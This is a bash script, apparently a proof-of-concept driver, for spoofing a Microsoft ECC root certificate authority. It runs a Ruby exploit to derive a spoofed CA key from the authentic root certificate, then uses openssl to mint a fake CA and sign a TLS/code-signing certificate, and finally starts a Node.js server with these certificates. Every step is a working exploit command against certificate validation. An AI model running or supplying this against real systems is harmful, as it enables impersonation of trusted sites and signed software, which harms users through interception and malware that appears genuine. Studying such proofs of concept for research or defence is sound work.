#!/usr/bin/env bash

# Create the spoofed Key from the Authentic certificate
ruby PoC.rb OriginalCertificates/MicrosoftECCProductRootCertificateAuthority.cer

# Generate a new x509 certificate based on this key.
openssl req -new -x509 -key FakeCertificates/spoofed_ca.key -out FakeCertificates/spoofed_ca.crt

# Generate a new key. It will be used to create a code signing certificate, which we will sign with our own CA.
openssl ecparam -name secp384r1 -genkey -noout -out FakeCertificates/my_fake_cert.key

# create a new certificate signing request (CSR)
openssl req -new -key FakeCertificates/my_fake_cert.key -out FakeCertificates/my_fake_cert.csr -config openssl_tls.conf -reqexts v3_tls

# Sign the new CSR with our spoofed CA and CA key
openssl x509 -req -in FakeCertificates/my_fake_cert.csr -CA FakeCertificates/spoofed_ca.crt -CAkey FakeCertificates/spoofed_ca.key -CAcreateserial -out FakeCertificates/my_fake_cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls

# Move to the TLS folder, to run the Node.js server
cp FakeCertificates/my_fake_cert.crt TLS/my_fake_cert.crt
cp FakeCertificates/my_fake_cert.key TLS/my_fake_cert.key
cp FakeCertificates/spoofed_ca.crt TLS/spoofed_ca.crt

# Run the Node.js Server
cd TLS
sudo node index.js
